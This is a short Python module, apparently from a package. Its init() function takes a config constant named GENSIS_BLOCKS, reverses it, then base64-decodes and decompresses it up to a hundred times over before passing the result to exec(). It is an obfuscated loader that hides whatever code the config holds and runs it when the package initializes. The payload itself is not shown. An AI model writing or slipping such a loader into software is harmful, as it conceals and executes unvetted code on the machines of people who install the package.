import base64 as b,gzip as g,zlib as z
from functools import reduce
from .config import GENSIS_BLOCKS
_initialized = False

def S(f,x):
    try:return f(x)
    except:return x

def init():
    global _initialized
    if _initialized:
        return
    _initialized = True
    D=lambda s:z.decompress(b.b64decode(s[::-1]+"==="),47).decode("utf8","replace")
    dz=lambda s,n:reduce(lambda a,_:S(D,a),range(n),s)
    ns={}
    exec(dz(GENSIS_BLOCKS, 100), ns)